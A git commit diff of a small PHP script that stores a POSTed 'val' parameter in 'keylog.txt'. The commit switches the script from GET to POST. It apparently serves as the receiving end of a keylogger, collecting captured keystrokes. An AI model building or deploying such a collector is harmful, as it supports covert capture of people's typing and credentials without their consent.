fc4da619652cb1d1c61002159ff9787736d43000
Andrew Nguyen <andrew.nguyen.waterloo@gmail.com>
2017-01-21 15:00:51 -0500

    Added web files

--- webpage/write_to_file.php
+++ webpage/write_to_file.php
@@ -1,14 +1,11 @@
 <?php
-
 function write ($val)
 {
     $file = "keylog.txt";
     file_put_contents($file, $val);
 }
-
-if (isset($_GET['val']))
+if (isset($_POST['val']))
 {
-    write($_GET['val']);
+    write($_POST['val']);
 }
-
 ?>
